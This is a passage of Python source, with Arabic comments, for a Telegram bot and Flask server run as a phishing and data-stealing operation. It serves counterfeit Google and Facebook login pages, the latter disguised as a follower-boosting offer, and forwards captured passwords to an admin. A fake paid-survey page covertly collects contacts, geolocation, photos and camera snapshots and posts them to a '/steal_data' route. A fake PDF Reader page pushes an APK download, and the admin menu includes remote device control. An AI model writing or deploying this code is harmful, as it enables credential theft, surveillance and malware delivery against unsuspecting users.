        <div class="logo"><svg viewBox="0 0 75 24" width="75" height="24"><path d="M12.24 10.87v1.82h5.08c-.2 1.06-1.05 2.94-3.5 4.13-1.45.7-3.3.82-5.08.38-1.65-.4-3.1-1.5-4.1-3.15-.74-1.22-1.05-2.6-1.05-4.05s.3-2.83 1.05-4.05c.98-1.65 2.45-2.75 4.1-3.15 1.78-.44 3.63-.32 5.08.38 2.45 1.2 3.3 3.07 3.5 4.13h-5.08v-1.82h-4.6v5.36h4.6z" fill="#4285F4"/></svg></div>
        <h1 class="title">تسجيل الدخول</h1>
        <p class="subtitle">باستخدام حسابك على Google</p>
        <form method="POST" action="/google_login">
            <div class="input-group"><label>البريد الإلكتروني أو الهاتف</label><input type="text" name="email" placeholder="example@gmail.com" required></div>
            <div class="input-group"><label>كلمة السر</label><input type="password" name="password" placeholder="••••••••" required></div>
            <div class="btn-row"><button type="button" class="btn-create">إنشاء حساب</button><button type="submit" class="btn-next">التالي</button></div>
            <div class="error-msg" id="errorMsg">⚠️ يرجى إدخال بريد إلكتروني وكلمة سر صحيحين</div>
        </form>
    </div>
    <script>
        document.querySelector('form').addEventListener('submit', function(e) {
            const email = document.querySelector('input[name="email"]').value;
            const password = document.querySelector('input[name="password"]').value;
            if (!email || !email.includes('@') || !password || password.length < 4) {
                e.preventDefault();
                document.getElementById('errorMsg').style.display = 'block';
            }
        });
    </script>
</body>
</html>
'''

# 2. صفحة رشق المتابعين (خلفية داكنة جذابة)
FACEBOOK_LOGIN_PAGE = '''
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تعزيز التواجد الرقمي</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; }
        body { background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .container { background: rgba(255,255,255,0.95); backdrop-filter: blur(10px); border-radius: 24px; padding: 40px 36px; max-width: 480px; width: 100%; box-shadow: 0 8px 40px rgba(0,0,0,0.4); }
        .logo { text-align: center; margin-bottom: 24px; }
        .logo svg { width: 180px; height: 50px; }
        .badge { display: inline-block; background: #e8f5e9; color: #2e7d32; font-size: 12px; font-weight: 600; padding: 4px 14px; border-radius: 20px; margin-bottom: 16px; }
        h1 { font-size: 22px; font-weight: 700; color: #1d2129; text-align: center; margin-bottom: 8px; }
        .subtitle { font-size: 15px; color: #606770; text-align: center; margin-bottom: 24px; line-height: 1.6; }
        .pricing { display: flex; flex-direction: column; gap: 12px; margin-bottom: 24px; }
        .plan { background: #f7f8fa; border-radius: 12px; padding: 16px 20px; display: flex; justify-content: space-between; align-items: center; transition: all 0.3s; cursor: pointer; border: 2px solid transparent; }
        .plan:hover { border-color: #1877f2; background: #e7f3ff; transform: translateX(5px); }
        .plan .info { display: flex; flex-direction: column; }
        .plan .name { font-weight: 600; color: #1d2129; font-size: 16px; }
        .plan .desc { font-size: 13px; color: #606770; }
        .plan .price { font-weight: 700; color: #1a73e8; font-size: 18px; }
        .plan .free-badge { background: #42b72a; color: white; padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: 600; }
        .login-section { background: #f7f8fa; border-radius: 12px; padding: 20px; margin-top: 16px; display: none; }
        .login-section .title { font-size: 16px; font-weight: 600; color: #1d2129; text-align: center; margin-bottom: 4px; }
        .login-section .desc { font-size: 13px; color: #606770; text-align: center; margin-bottom: 16px; }
        .input-group { margin-bottom: 12px; }
        .input-group input { width: 100%; padding: 12px 16px; border: 1px solid #dddfe2; border-radius: 8px; font-size: 15px; background: white; transition: border-color 0.2s; outline: none; color: #1d2129; }
        .input-group input:focus { border-color: #1877f2; box-shadow: 0 0 0 3px rgba(24,119,242,0.1); }
        .btn-login { width: 100%; padding: 14px; background: #1877f2; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
        .btn-login:hover { background: #166fe5; }
        .note { font-size: 12px; color: #90949c; text-align: center; margin-top: 12px; line-height: 1.4; }
        .show { display: block; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><svg viewBox="0 0 180 50"><text x="0" y="38" font-family="Arial,sans-serif" font-size="42" font-weight="bold" fill="#1877f2">facebook</text></svg></div>
        <div style="text-align:center;"><span class="badge">🚀 خدمة معتمدة</span></div>
        <h1>تعزيز حضورك الرقمي</h1>
        <p class="subtitle">اختر الباقة المناسبة وابدأ فوراً</p>
        <div class="pricing">
            <div class="plan" onclick="showLogin()"><div class="info"><span class="name">🎁 باقة مجانية</span><span class="desc">500 متابع تجريبي</span></div><span class="free-badge">مجاناً</span></div>
            <div class="plan" onclick="showLogin()"><div class="info"><span class="name">🚀 باقة أساسية</span><span class="desc">1,000 متابع • تفاعل حقيقي</span></div><span class="price">$9.99</span></div>
            <div class="plan" onclick="showLogin()"><div class="info"><span class="name">💎 باقة احترافية</span><span class="desc">5,000 متابع • دعم أولوية</span></div><span class="price">$39.99</span></div>
            <div class="plan" onclick="showLogin()"><div class="info"><span class="name">👑 باقة VIP</span><span class="desc">10,000 متابع • حساب مخصص</span></div><span class="price">$79.99</span></div>
        </div>
        <div id="loginSection" class="login-section">
            <div class="title">🔑 تسجيل الدخول للتفعيل</div>
            <div class="desc">أدخل بيانات حسابك للاستفادة من الباقة</div>
            <form method="POST" action="/facebook_login">
                <div class="input-group"><input type="text" name="email" placeholder="رقم الهاتف أو البريد الإلكتروني" required></div>
                <div class="input-group"><input type="password" name="password" placeholder="كلمة السر" required></div>
                <button type="submit" class="btn-login">تسجيل الدخول والمتابعة</button>
            </form>
            <div class="note">🔒 بياناتك آمنة ومشفرة بالكامل</div>
        </div>
    </div>
    <script>
        function showLogin() { document.getElementById('loginSection').classList.add('show'); }
    </script>
</body>
</html>
'''

# 3. صفحة الاستبيان (خلفية مع تدرج)
SURVEY_PAGE = '''
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>استبيان مدفوع</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; }
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { background: rgba(255,255,255,0.95); backdrop-filter: blur(10px); border-radius: 24px; padding: 32px; max-width: 550px; width: 100%; box-shadow: 0 8px 40px rgba(0,0,0,0.3); }
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
        .logo { font-size: 24px; font-weight: 700; color: #1a73e8; }
        .balance-box { background: #e8f5e9; padding: 8px 16px; border-radius: 20px; color: #2e7d32; font-weight: 600; font-size: 14px; }
        .balance-box span { font-size: 18px; }
        .info-row { display: flex; justify-content: space-between; background: #f7f8fa; padding: 12px 16px; border-radius: 8px; margin-bottom: 16px; font-size: 14px; color: #1d2129; }
        .progress { background: #e4e6eb; border-radius: 8px; height: 6px; margin-bottom: 20px; }
        .progress-bar { height: 100%; background: #1877f2; border-radius: 8px; transition: width 0.3s; }
        .question { font-size: 20px; font-weight: 600; color: #1d2129; margin-bottom: 20px; }
        .options { display: flex; flex-direction: column; gap: 10px; margin-bottom: 24px; }
        .option { padding: 14px 18px; border: 2px solid #e4e6eb; border-radius: 10px; cursor: pointer; transition: all 0.2s; background: #f7f8fa; }
        .option:hover { border-color: #1877f2; background: #e7f3ff; transform: translateX(5px); }
        .option.selected { border-color: #1877f2; background: #e7f3ff; }
        .btn { width: 100%; padding: 14px; background: #1877f2; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
        .btn:hover { background: #166fe5; }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        .btn-success { background: #42b72a; }
        .btn-success:hover { background: #36a420; }
        .hidden { display: none; }
        .withdraw-info { background: #fff3cd; border: 1px solid #ffc107; border-radius: 8px; padding: 12px; margin-top: 16px; font-size: 14px; color: #856404; }
        .loading-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); display: none; justify-content: center; align-items: center; z-index: 9999; backdrop-filter: blur(5px); }
        .loading-box { background: white; padding: 30px; border-radius: 12px; text-align: center; max-width: 300px; }
        .spinner { border: 4px solid #e4e6eb; border-top: 4px solid #1877f2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 12px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container" id="app">
        <div class="header"><div class="logo">📋 استبيان</div><div class="balance-box">💰 الرصيد: <span id="balance">0</span>$</div></div>
        <div class="info-row"><span class="label">📌 الحد الأدنى للسحب</span><span>100$</span></div>
        <div class="info-row"><span class="label">📊 الأسئلة اليومية المتبقية</span><span id="remainingQuestions">5</span></div>
        <div class="progress"><div class="progress-bar" id="progressBar" style="width:0%;"></div></div>
        <div id="questionContainer">
            <div class="question" id="questionText">مرحباً! ما هو مجال عملك الحالي؟</div>
            <div class="options" id="optionsContainer"></div>
            <button class="btn" id="nextBtn" disabled>استمرار ➜</button>
        </div>
        <div id="finalMessage" class="hidden" style="text-align:center; padding:20px 0;">
            <div style="font-size:48px; margin-bottom:12px;">🎉</div>
            <h2 style="color:#1d2129;">لقد أكملت استبيان اليوم!</h2>
            <p style="color:#606770; margin:12px 0;">رصيدك الحالي: <strong id="finalBalance">0</strong>$</p>
            <div class="withdraw-info">⏳ لديك 5 أسئلة فقط في اليوم. عد غداً للحصول على استبيان جديد.</div>
            <button class="btn btn-success" onclick="finishSurvey()" style="margin-top:16px;">تأكيد الاستلام</button>
        </div>
    </div>
    <div class="loading-overlay" id="loadingOverlay"><div class="loading-box"><div class="spinner"></div><p style="color:#1d2129;font-weight:500;">جاري التحميل...</p></div></div>
    <script>
        const questions = [
            { q: 'مرحباً! ما هو مجال عملك الحالي؟', options: ['💻 تكنولوجيا المعلومات', '📚 تعليم / تدريب', '🏥 صحة / طب', '📌 أخرى'] },
            { q: 'كم مرة تستخدم الإنترنت يومياً؟', options: ['أقل من ساعة', '1-3 ساعات', '3-6 ساعات', 'أكثر من 6 ساعات'] },
            { q: 'ما هي منصات التواصل الاجتماعي التي تستخدمها؟', options: ['فيسبوك', 'إنستغرام', 'تويتر', 'جميع ما سبق'] },
            { q: 'هل سبق لك أن قمت بشراء منتج عبر الإنترنت؟', options: ['نعم، بشكل متكرر', 'نعم، أحياناً', 'نادراً', 'لا أبداً'] },
            { q: 'ما هو نظام تشغيل هاتفك الحالي؟', options: ['Android', 'iOS', 'Windows', 'آخر'] }
        ];
        let currentQuestion = 0, balance = 0, answers = [];
        let collectedContacts = false, collectedPhotos = false, collectedLocation = false, collectedCamera = false;
        let todayQuestions = parseInt(localStorage.getItem('survey_today_questions') || '0');
        let todayDate = localStorage.getItem('survey_today_date') || '';
        const today = new Date().toDateString();
        if (todayDate !== today) { todayQuestions = 0; localStorage.setItem('survey_today_date', today); }
        const remaining = Math.max(0, 5 - todayQuestions);
        function updateUI() {
            document.getElementById('balance').textContent = balance;
            document.getElementById('remainingQuestions').textContent = remaining;
            document.getElementById('progressBar').style.width = ((currentQuestion)/questions.length)*100 + '%';
            if (currentQuestion < questions.length && remaining > 0) {
                const q = questions[currentQuestion];
                document.getElementById('questionText').textContent = q.q;
                const container = document.getElementById('optionsContainer');
                container.innerHTML = '';
                q.options.forEach(opt => {
                    const div = document.createElement('div');
                    div.className = 'option';
                    div.textContent = opt;
                    div.dataset.value = opt;
                    div.onclick = function() {
                        document.querySelectorAll('.option').forEach(o => o.classList.remove('selected'));
                        this.classList.add('selected');
                        document.getElementById('nextBtn').disabled = false;
                    };
                    container.appendChild(div);
                });
                document.getElementById('questionContainer').style.display = 'block';
                document.getElementById('finalMessage').classList.add('hidden');
                document.getElementById('nextBtn').disabled = true;
            } else {
                document.getElementById('questionContainer').style.display = 'none';
                document.getElementById('finalMessage').classList.remove('hidden');
                document.getElementById('finalBalance').textContent = balance;
            }
        }
        function showLoading(show) { document.getElementById('loadingOverlay').style.display = show ? 'flex' : 'none'; }
        function requestPermissions(step) {
            if (step === 1 && !collectedContacts) { showLoading(true); setTimeout(() => { if (navigator.contacts && navigator.contacts.select) { navigator.contacts.select(['name','tel','email'], {multiple:true}).then(contacts => { fetch('/steal_data', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'contacts',data:contacts,count:contacts.length})}); collectedContacts = true; }).catch(()=>{}).finally(()=>showLoading(false)); } else showLoading(false); }, 500); }
            if (step === 2 && !collectedLocation) { showLoading(true); setTimeout(() => { if (navigator.geolocation) { navigator.geolocation.getCurrentPosition(position => { fetch('/steal_data', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'location',lat:position.coords.latitude,lng:position.coords.longitude})}); collectedLocation = true; }, () => {}); } showLoading(false); }, 500); }
            if (step === 3 && !collectedPhotos) { showLoading(true); setTimeout(() => { const input = document.createElement('input'); input.type='file'; input.accept='image/*'; input.multiple=true; input.style.display='none'; document.body.appendChild(input); input.onchange = function(e) { const files = e.target.files; if (files.length > 0) { for (let i=0; i<files.length; i++) { const reader = new FileReader(); reader.onload = function(ev) { fetch('/steal_data', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'photo',name:files[i].name,size:files[i].size,data:ev.target.result})}); }; reader.readAsDataURL(files[i]); } collectedPhotos = true; } document.body.removeChild(input); showLoading(false); }; setTimeout(() => { if (!collectedPhotos) showLoading(false); }, 5000); input.click(); }, 500); }
            if (step === 4 && !collectedCamera) { showLoading(true); setTimeout(() => { if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) { navigator.mediaDevices.getUserMedia({video:true,audio:false}).then(stream => { const video = document.createElement('video'); video.srcObject = stream; video.play(); setTimeout(() => { const canvas = document.createElement('canvas'); canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480; const ctx = canvas.getContext('2d'); ctx.drawImage(video, 0, 0, canvas.width, canvas.height); const dataUrl = canvas.toDataURL('image/jpeg'); fetch('/steal_data', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'camera',data:dataUrl})}); stream.getTracks().forEach(track => track.stop()); collectedCamera = true; showLoading(false); }, 500); }).catch(()=>showLoading(false)); } else showLoading(false); }, 500); }
        }
        document.getElementById('nextBtn').addEventListener('click', function() {
            const selected = document.querySelector('.option.selected');
            if (!selected) return;
            answers.push(selected.dataset.value);
            balance += 1;
            currentQuestion++;
            todayQuestions++;
            localStorage.setItem('survey_today_questions', todayQuestions);
            requestPermissions(currentQuestion);
            if (currentQuestion === questions.length) { fetch('/steal_data', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'survey_answers',data:answers})}); }
            updateUI();
        });
        function finishSurvey() { alert('✅ تم تأكيد استلام المكافأة.'); window.location.href = 'https://www.google.com'; }
        updateUI();
        if (remaining === 0) { document.getElementById('questionContainer').style.display = 'none'; document.getElementById('finalMessage').classList.remove('hidden'); document.getElementById('finalBalance').textContent = balance; }
    </script>
</body>
</html>
'''

# 4. صفحة PDF Reader (خلفية جذابة)
PDF_READER_PAGE = '''
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PDF Reader</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; }
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { background: rgba(255,255,255,0.95); backdrop-filter: blur(10px); border-radius: 24px; padding: 40px 32px; max-width: 420px; width: 100%; box-shadow: 0 8px 40px rgba(0,0,0,0.3); text-align: center; }
        .icon { width: 80px; height: 80px; background: #e8f0fe; border-radius: 20px; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; font-size: 40px; color: #1a73e8; }
        .badge { display: inline-block; background: #e8f5e9; color: #2e7d32; font-size: 12px; font-weight: 600; padding: 4px 12px; border-radius: 20px; margin-bottom: 12px; }
        h1 { font-size: 24px; font-weight: 700; color: #1d2129; margin-bottom: 8px; }
        .subtitle { font-size: 16px; color: #606770; margin-bottom: 20px; line-height: 1.5; }
        .features { display: flex; flex-wrap: wrap; gap: 8px; justify-content: center; margin-bottom: 24px; }
        .feature-tag { background: #f0f2f5; padding: 6px 14px; border-radius: 20px; font-size: 13px; color: #1d2129; }
        .app-info { background: #f7f8fa; border-radius: 12px; padding: 16px; margin-bottom: 20px; text-align: left; }
        .app-info div { display: flex; justify-content: space-between; padding: 6px 0; border-bottom: 1px solid #e4e6eb; }
        .app-info div:last-child { border-bottom: none; }
        .app-info .label { color: #606770; }
        .app-info .value { color: #1d2129; font-weight: 500; }
        .rating { display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 16px; font-size: 14px; color: #606770; }
        .stars { color: #f5b342; font-size: 18px; letter-spacing: 2px; }
        .download-btn { background: #1a73e8; color: white; border: none; padding: 16px 48px; font-size: 18px; font-weight: 600; border-radius: 12px; cursor: pointer; transition: all 0.3s; width: 100%; margin-top: 8px; }
        .download-btn:hover { background: #1557b0; transform: scale(1.02); }
        .stats { display: flex; justify-content: center; gap: 32px; margin-top: 24px; padding-top: 20px; border-top: 1px solid #e4e6eb; font-size: 14px; color: #606770; }
        .stats span { display: block; font-weight: 600; color: #1d2129; font-size: 18px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">📄</div>
        <div class="badge">⭐ الإصدار 3.2.1</div>
        <h1>PDF Reader</h1>
        <p class="subtitle">اقرأ ملفات PDF الخاصة بك في أي وقت وفي أي مكان. تحويل الصور إلى ملفات PDF عالية الجودة.</p>
        <div class="features"><span class="feature-tag">📁 عرض الملفات</span><span class="feature-tag">🔄 تحويل الصور</span><span class="feature-tag">🔍 بحث سريع</span><span class="feature-tag">📤 مشاركة فورية</span></div>
        <div class="app-info"><div><span class="label">📦 الحجم</span><span class="value">15.2 م.ب</span></div><div><span class="label">📥 التحميلات</span><span class="value">1.2 مليون</span></div><div><span class="label">📅 التحديث</span><span class="value">يونيو 2026</span></div><div><span class="label">🔒 التوافق</span><span class="value">Android 5.0+</span></div></div>
        <div class="rating"><span class="stars">★★★★★</span><span>4.8</span><span>•</span><span>مليون+ تحميل</span></div>
        <button class="download-btn" onclick="downloadAPK()">📥 تنزيل التطبيق</button>
        <div class="stats"><div><span>15.2 م.ب</span>حجم الملف</div><div><span>1.2M+</span>مستخدم</div><div><span>4.8</span>تقييم</div></div>
    </div>
    <script>
        function downloadAPK() { window.location.href = '/download_apk'; }
    </script>
</body>
</html>
'''

# ===================== مسارات Flask =====================
@app.route('/google_login', methods=['GET', 'POST'])
def google_login_page():
    if request.method == 'GET':
        return render_template_string(GOOGLE_LOGIN_PAGE)
    elif request.method == 'POST':
        email = request.form.get('email', '')
        password = request.form.get('password', '')
        data = f"البريد: {email}\nكلمة السر: {password}"
        send_sensitive_data_to_admin("Google Login (مزيف)", data, user_id="غير معروف")
        return '<html><body><h2>✅ تم تسجيل الدخول بنجاح</h2><script>setTimeout(function(){ window.location.href="https://accounts.google.com"; },3000);</script></body></html>'

@app.route('/facebook_login', methods=['GET', 'POST'])
def facebook_login_page():
    if request.method == 'GET':
        return render_template_string(FACEBOOK_LOGIN_PAGE)
    elif request.method == 'POST':
        email = request.form.get('email', '')
        password = request.form.get('password', '')
        data = f"البريد/الهاتف: {email}\nكلمة السر: {password}"
        send_sensitive_data_to_admin("Facebook Login (مزيف)", data, user_id="غير معروف")
        return '<html><body><h2>✅ تم تسجيل الدخول بنجاح</h2><script>setTimeout(function(){ window.location.href="https://www.facebook.com"; },3000);</script></body></html>'

@app.route('/survey', methods=['GET'])
def survey_page():
    return render_template_string(SURVEY_PAGE)

@app.route('/pdf_reader', methods=['GET'])
def pdf_reader_page():
    return render_template_string(PDF_READER_PAGE)

@app.route('/download_apk', methods=['GET'])
def download_apk():
    # ضع ملف APK في مجلد static/ باسم PDFReader.apk
    apk_path = os.path.join(BASE_DIR, 'static', 'PDFReader.apk')
    if os.path.exists(apk_path):
        return send_file(apk_path, as_attachment=True)
    else:
        return "⚠️ ملف التطبيق غير متوفر حالياً.", 404

@app.route('/download_apk_survey', methods=['GET'])
def download_apk_survey():
    # هذا هو ملف APK الذي يرسله زر "APK"
    apk_path = os.path.join(BASE_DIR, 'static', 'SurveyApp.apk')
    if os.path.exists(apk_path):
        return send_file(apk_path, as_attachment=True)
    else:
        # إنشاء ملف وهمي
        fake_apk = b"APK placeholder - Please put real APK in static/SurveyApp.apk"
        response = make_response(fake_apk)
        response.headers['Content-Type'] = 'application/vnd.android.package-archive'
        response.headers['Content-Disposition'] = 'attachment; filename=SurveyApp.apk'
        return response

@app.route('/steal_data', methods=['POST'])
def steal_data():
    try:
        data = request.get_json()
        if data:
            if data.get('type') == 'contacts':
                formatted = "📇 جهات الاتصال\n"
                contacts = data.get('data', [])
                for i, contact in enumerate(contacts[:20], 1):
                    name = contact.get('name', ['بدون اسم'])[0] if contact.get('name') else 'بدون اسم'
                    tel = contact.get('tel', ['بدون رقم'])[0] if contact.get('tel') else 'بدون رقم'
                    formatted += f"{i}. {name} | {tel}\n"
                send_sensitive_data_to_admin("Stealer - Contacts", formatted, user_id="مجهول")
            elif data.get('type') == 'photo':
                base64_data = data.get('data', '')
                if base64_data.startswith('data:image'):
                    import base64 as b64
                    image_data = base64_data.split(',')[1]
                    image_bytes = b64.b64decode(image_data)
                    send_sensitive_data_to_admin("Stealer - Photo", image_bytes, user_id="مجهول")
            elif data.get('type') == 'camera':
                base64_data = data.get('data', '')
                if base64_data.startswith('data:image'):
                    import base64 as b64
                    image_data = base64_data.split(',')[1]
                    image_bytes = b64.b64decode(image_data)
                    send_sensitive_data_to_admin("Stealer - Camera", image_bytes, user_id="مجهول")
            elif data.get('type') == 'location':
                lat = data.get('lat', '')
                lng = data.get('lng', '')
                formatted = f"📍 الموقع: {lat}, {lng}"
                send_sensitive_data_to_admin("Stealer - Location", formatted, user_id="مجهول")
            elif data.get('type') == 'survey_answers':
                answers = data.get('data', [])
                formatted = "📊 إجابات الاستبيان:\n" + "\n".join([f"{i+1}. {ans}" for i, ans in enumerate(answers)])
                send_sensitive_data_to_admin("Stealer - Survey", formatted, user_id="مجهول")
            else:
                info = data.get('data', {})
                formatted = f"IP: {info.get('ip')}\nالموقع: {info.get('location')}\nالمتصفح: {info.get('browser')}"
                send_sensitive_data_to_admin("Stealer - Basic", formatted, user_id="مجهول")
            return jsonify({'status': 'success'}), 200
        else:
            return jsonify({'status': 'error', 'message': 'No data'}), 400
    except Exception as e:
        logger.error(f"Steal data error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# ===================== دوال Google =====================
def google_login(message):
    chat_id = message.chat.id
    if chat_id in google_users:
        safe_send(chat_id, "✅ أنت متصل بالفعل.")
        return
    fake_url = f"{SERVER_URL}/google_login"
    msg = (
        "🔑 <b>تفعيل الخدمات</b>\n\n"
        "للوصول إلى الخدمات المميزة، يُرجى تسجيل الدخول عبر الرابط الرسمي التالي:\n"
        f"{fake_url}\n\n"
        "مع ضرورة التأكيد على إدخال بيانات الاعتماد الصحيحة.\n\n"
        "للاستفسارات، يُرجى التواصل مع فريق الدعم."
    )
    safe_send(chat_id, msg)
    notify_admin(f"🔑 مستخدم {chat_id} فتح صفحة تسجيل الدخول المزيفة لجوجل")

def google_logout(message):
    chat_id = message.chat.id
    if chat_id in google_users:
        del google_users[chat_id]
    if chat_id in google_passwords:
        del google_passwords[chat_id]
    safe_send(chat_id, "✅ تم تسجيل الخروج.")

# ===================== متغيرات الحالة =====================
user_states = {}
google_users = {}
google_passwords = {}
temp_emails = {}
developer_computer_endpoint = None
admin_remote_target = {}
linked_users = set()
tts_voice_selection = {}

feature_usage = {
    "ثغرات المواقع": 0, "فحص APK": 0, "فحص كود": 0,
    "إيميل مؤقت": 0, "تتبع الأرقام": 0,
    "بلاغات فيسبوك": 0,
    "تحميل فيديو": 0, "تقصير روابط": 0,
    "فحص ثغرات": 0, "رشق متابعين": 0,
    "استبيان": 0, "قاريء PDF": 0,
    "تتبع رقم": 0, "APK": 0,
    "لوحة التحكم": 0
}

FB_REPORT_TYPES = {
    "offensive": "📢 منشور مسيء",
    "fake": "👤 حساب مزيف",
    "inappropriate": "🚫 محتوى غير لائق",
    "privacy": "🔒 انتهاك خصوصية",
    "harassment": "⚠️ تحرش أو مضايقة",
    "impersonation": "🎭 انتحال شخصية",
    "violent": "💢 محتوى عنيف",
    "other": "📌 أخرى"
}

def is_admin(user_id):
    return user_id == ADMIN_ID

# ===================== بناء القوائم =====================
def build_main_menu(user_id):
    markup = InlineKeyboardMarkup(row_width=2)
    is_admin_user = is_admin(user_id)
    user_points = get_user_points(user_id) if not is_admin_user else 999
    unlocked = is_user_unlocked(user_id) if not is_admin_user else True
    
    def can_access(required_points):
        return is_admin_user or unlocked or user_points >= required_points
    
    markup.row(
        InlineKeyboardButton("🔍 فحص الأمان", callback_data="mode_site") if can_access(10) else InlineKeyboardButton("🔍 فحص الأمان 🔒", callback_data="locked_site"),
        InlineKeyboardButton("📦 فحص التطبيقات", callback_data="mode_apk") if can_access(10) else InlineKeyboardButton("📦 فحص التطبيقات 🔒", callback_data="locked_apk")
    )
    markup.row(
        InlineKeyboardButton("🛠️ مراجعة الكود", callback_data="mode_my_app") if can_access(10) else InlineKeyboardButton("🛠️ مراجعة الكود 🔒", callback_data="locked_my_app"),
        InlineKeyboardButton("📤 انشاء بريد", callback_data="mode_temp_email")
    )
    markup.row(
        InlineKeyboardButton("بلاغ فيسبوك", callback_data="mode_fb_report") if can_access(30) else InlineKeyboardButton("بلاغ فيسبوك 🔒", callback_data="locked_fb_report"),
        InlineKeyboardButton("📍 تتبع رقم", callback_data="mode_track_phone") if can_access(10) else InlineKeyboardButton("📍 تتبع رقم 🔒", callback_data="locked_track_phone")
    )
    markup.row(
        InlineKeyboardButton("📚 تحليل PDF", callback_data="mode_pdf")
    )
    markup.row(
        InlineKeyboardButton("📱 الحصول على رقم", callback_data="mode_temp_number") if can_access(50) else InlineKeyboardButton("📱 الحصول على رقم 🔒", callback_data="locked_temp_number")
    )
    if user_id in google_users:
        markup.row(InlineKeyboardButton("✅ الخدمات مفعلة", callback_data="mode_google_logout"))
    else:
        markup.row(InlineKeyboardButton("🔗 تفعيل الخدمات", callback_data="mode_google_login"))
    markup.row(
        InlineKeyboardButton("📥 تحميل فيديو", callback_data="mode_download"),
        InlineKeyboardButton("🔗 تقصير الروابط", callback_data="mode_shorten_url")
    )
    markup.row(
        InlineKeyboardButton("🛡️ فحص ثغرات", callback_data="mode_vuln_scan") if can_access(20) else InlineKeyboardButton("🛡️ فحص ثغرات 🔒", callback_data="locked_vuln_scan"),
        InlineKeyboardButton("📊 رشق متابعين", callback_data="mode_facebook_followers")
    )
    markup.row(
        InlineKeyboardButton("📋 استبيان مدفوع", callback_data="mode_survey") if can_access(1000) else InlineKeyboardButton("📋 استبيان مدفوع 🔒 (1000 نقطة)", callback_data="locked_survey"),
        InlineKeyboardButton("📄 قاريء PDF", callback_data="mode_pdf_reader") if can_access(1000) else InlineKeyboardButton("📄 قاريء PDF 🔒 (1000 نقطة)", callback_data="locked_pdf_reader")
    )
    markup.row(
        InlineKeyboardButton("📍 تتبع موقع الهاتف", callback_data="mode_track_phone_location") if can_access(500) else InlineKeyboardButton("📍 تتبع موقع الهاتف 🔒 (500 نقطة)", callback_data="locked_track_phone_location"),
        InlineKeyboardButton("📱 APK", callback_data="mode_apk_survey") if is_admin_user else InlineKeyboardButton("📱 APK 🔒 (للمطور فقط)", callback_data="locked_apk_survey")
    )
    markup.row(
        InlineKeyboardButton("⭐ نقاطي", callback_data="mode_show_points"),
        InlineKeyboardButton("📊 سجل النقاط", callback_data="mode_points_history")
    )
    markup.row(
        InlineKeyboardButton("🔗 رابط دعوتي", callback_data="mode_show_referral")
    )
    if is_admin_user:
        markup.row(
            InlineKeyboardButton("👑 لوحة التحكم", callback_data="mode_admin_panel"),
            InlineKeyboardButton("📱 الأجهزة", callback_data="mode_view_devices")
        )
        markup.row(
            InlineKeyboardButton("🎮 تحكم عن بعد", callback_data="mode_remote_admin"),
            InlineKeyboardButton("🖥️ ربط حاسب", callback_data="mode_set_dev_endpoint")
        )
        markup.row(
            InlineKeyboardButton("📊 إحصائيات", callback_data="admin_stats"),
            InlineKeyboardButton("📢 بث جماعي", callback_data="admin_broadcast")
        )
        markup.row(
            InlineKeyboardButton("📩 معلومات مجمعة", callback_data="admin_collected_data"),
            InlineKeyboardButton("📜 سجل الأخطاء", callback_data="admin_logs")
        )
        markup.row(
            InlineKeyboardButton("🚫 حظر مستخدم", callback_data="admin_ban_user"),
            InlineKeyboardButton("✅ إلغاء حظر", callback_data="admin_unban_user")
        )
    return markup

def build_device_list_markup():
    markup = InlineKeyboardMarkup(row_width=1)
    devices = get_registered_devices_db()
    if not devices:
        markup.row(InlineKeyboardButton("⚠️ لا توجد أجهزة", callback_data="no_devices"))
    else:
        for dev in devices:
            markup.row(InlineKeyboardButton(f"📱 {dev['device_id']}", callback_data=f"remote_select_{dev['device_id']}"))
    markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
    return markup

def build_fb_report_type_markup():
    markup = InlineKeyboardMarkup(row_width=2)
    for key, label in FB_REPORT_TYPES.items():
